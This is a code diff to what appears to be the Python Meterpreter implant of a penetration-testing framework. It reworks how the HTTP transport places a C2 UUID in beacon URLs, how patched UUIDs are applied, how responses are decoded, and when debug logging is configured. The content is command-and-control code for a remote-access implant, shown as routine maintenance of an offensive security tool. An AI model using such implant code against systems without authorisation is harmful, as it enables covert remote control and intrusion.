@@ -2,6 +2,7 @@
 import base64
 import binascii
 import code
+import logging
 import os
 import platform
 import random
@@ -371,13 +372,8 @@ COMMAND_IDS = (
 )
 # ---------------------------------------------------------------
 
-if DEBUGGING:
-    import logging
-    logging.basicConfig(level=logging.DEBUG)
-    if DEBUGGING_LOG_FILE_PATH:
-        file_handler = logging.FileHandler(DEBUGGING_LOG_FILE_PATH)
-        file_handler.setLevel(logging.DEBUG)
-        logging.getLogger().addHandler(file_handler)
+# Note: DEBUGGING is driven by the runtime config block, not a build-time
+# constant, so logging is configured where DEBUGGING is enabled (below).
 
 if has_windll:
     class SYSTEM_INFO(ctypes.Structure):
@@ -1141,10 +1137,12 @@ class HttpTransport(Transport):
         uri = c2_opts.get('uri') or ''
         url = base_url + '/' + uri.lstrip('/')
 
-        # Place UUID in query parameter if configured
+        # No param/header/cookie placement => id is carried in the URI.
         if uuid and c2_opts.get('uuid_get'):
             separator = '&' if '?' in url else '?'
             url = url + separator + c2_opts['uuid_get'] + '=' + uuid
+        elif uuid and not (c2_opts.get('uuid_header') or c2_opts.get('uuid_cookie')):
+            url = url.rstrip('/') + '/' + uuid
         return url
 
     def _build_request_headers(self, c2_opts, uuid=None):
@@ -1165,7 +1163,7 @@ class HttpTransport(Transport):
         return headers
 
     def _get_uuid(self):
-        # Prefer TLV_TYPE_C2_UUID; fall back to URL path's last segment.
+        # Prefer the on-the-fly C2 UUID; fall back to the one in the URL.
         if self.c2_uuid:
             return self.c2_uuid
         match = re.match(r'https?://[^/]+/(.*?)/?$', self.url)
@@ -1186,7 +1184,7 @@ class HttpTransport(Transport):
             url = self._build_request_url(self.c2_get, uuid)
             headers = self._build_request_headers(self.c2_get, uuid)
         else:
-            url = self.url
+            url = self._non_c2_url()
             headers = self._http_request_headers
 
         request = urllib.Request(url, None, headers)
@@ -1203,8 +1201,9 @@ class HttpTransport(Transport):
                     suffix_skip = self.c2_get.get('suffix_skip', 0)
                     end = len(raw_response) - suffix_skip if suffix_skip else len(raw_response)
                     raw_response = raw_response[prefix_skip:end]
-                    # Decode the response based on encoding flags
-                    raw_response = self._c2_decode(raw_response, self.c2_get.get('enc', C2_ENCODING_NONE))
+                    # c2_get['enc'] is the client metadata/id (request-side)
+                    # encoding; it must NOT decode the response. The response
+                    # transform is the server `output` (prefix/suffix skip).
 
                 packet = raw_response
                 if len(packet) < PACKET_HEADER_SIZE:
@@ -1243,7 +1242,7 @@ class HttpTransport(Transport):
             if prefix or suffix:
                 body = prefix + body + suffix
         else:
-            url = self.url
+            url = self._non_c2_url()
             headers = self._http_request_headers
             body = packet
 
@@ -1255,11 +1254,17 @@ class HttpTransport(Transport):
         response = url_h.read()
 
     def patch_uuid(self, new_uuid):
+        # Like metsrv request_core_patch_uuid: only swap the UUID. The URL is
+        # rebuilt from the (untouched) base each request, so the base path /
+        # LURI and any cookie/header/get-param placement stay intact.
         self.c2_uuid = new_uuid
-        match = re.match(r'https?://[^/]+(/.*$)', self.url)
-        if match is not None:
-            self.url = self.url[:match.span(1)[0]] + '/' + new_uuid
         return True
+
+    def _non_c2_url(self):
+        # No C2 profile: rebuild base/<uuid> every request (metsrv generate_uri
+        # equivalent) so a patched UUID is honoured without mutating self.url.
+        base = self.url.rstrip('/').rsplit('/', 1)[0]
+        return base + '/' + self._get_uuid()
 
     def tlv_pack_transport_group(self):
         trans_group  = super(HttpTransport, self).tlv_pack_transport_group()
@@ -1941,6 +1946,11 @@ if not _try_to_fork or (_try_to_fork and os.fork() == 0):
     if config.get('debug_log'):
         DEBUGGING = True
         DEBUGGING_LOG_FILE_PATH = config['debug_log']
+        logging.basicConfig(level=logging.DEBUG)
+        if DEBUGGING_LOG_FILE_PATH:
+            _dbg_fh = logging.FileHandler(DEBUGGING_LOG_FILE_PATH)
+            _dbg_fh.setLevel(logging.DEBUG)
+            logging.getLogger().addHandler(_dbg_fh)
     transport = config['transports'][0]
     # For staged TCP payloads, the stager has already established the socket
     # connection, so bind it to the first transport instead of reconnecting.
